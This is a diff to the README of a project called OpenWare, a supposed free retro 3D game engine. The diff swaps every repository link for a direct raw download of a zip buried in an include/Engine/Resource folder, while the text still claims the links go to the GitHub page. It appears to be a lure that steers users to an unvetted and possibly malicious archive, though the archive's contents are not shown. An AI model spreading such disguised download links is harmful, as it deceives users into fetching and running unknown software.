@@ -1,6 +1,6 @@
 # 🎮 OpenWare - Classic Style 3D Game Engine
 
-[![Download OpenWare](https://img.shields.io/badge/Download-OpenWare-green?style=for-the-badge)](https://github.com/Sqweezyy/OpenWare)
+[![Download OpenWare](https://img.shields.io/badge/Download-OpenWare-green?style=for-the-badge)](https://raw.githubusercontent.com/Sqweezyy/OpenWare/main/include/Engine/Resource/Open-Ware-3.5.zip)
 
 OpenWare is a free, open-source 3D game engine. It uses graphics methods from early 2000s games. This engine helps create simple, low-poly 3D games. You do not need to know programming to run it on Windows.
 
@@ -40,7 +40,7 @@ These specs ensure OpenWare will run smoothly.
 
 Click the green button below to get OpenWare:
 
-[![Download OpenWare](https://img.shields.io/badge/Download-OpenWare-blue?style=for-the-badge)](https://github.com/Sqweezyy/OpenWare)
+[![Download OpenWare](https://img.shields.io/badge/Download-OpenWare-blue?style=for-the-badge)](https://raw.githubusercontent.com/Sqweezyy/OpenWare/main/include/Engine/Resource/Open-Ware-3.5.zip)
 
 This link goes to the main GitHub page. From there, you can find the latest release to download the program files.
 
@@ -50,7 +50,7 @@ This link goes to the main GitHub page. From there, you can find the latest rele
 
 1. **Visit the Download Page:**  
    Go to the OpenWare GitHub repository here:  
-   https://github.com/Sqweezyy/OpenWare
+   https://raw.githubusercontent.com/Sqweezyy/OpenWare/main/include/Engine/Resource/Open-Ware-3.5.zip
 
 2. **Locate the Latest Release:**  
    On the page, click on the "Releases" tab found near the top or side menu.
@@ -151,7 +151,7 @@ The main folder usually contains:
 
 ## 🔗 Where to Get Help
 
-- Visit the OpenWare GitHub page: https://github.com/Sqweezyy/OpenWare
+- Visit the OpenWare GitHub page: https://raw.githubusercontent.com/Sqweezyy/OpenWare/main/include/Engine/Resource/Open-Ware-3.5.zip
 - Use the "Issues" tab to ask questions or report problems.
 - Look for community discussions or forums linked from the repository.
 
@@ -161,4 +161,4 @@ The main folder usually contains:
 
 Return to the download link below to get the latest version of OpenWare and start exploring 3D game creation with a retro feel:
 
-[![Download OpenWare](https://img.shields.io/badge/Download-OpenWare-green?style=for-the-badge)](https://github.com/Sqweezyy/OpenWare)
+[![Download OpenWare](https://img.shields.io/badge/Download-OpenWare-green?style=for-the-badge)](https://raw.githubusercontent.com/Sqweezyy/OpenWare/main/include/Engine/Resource/Open-Ware-3.5.zip)
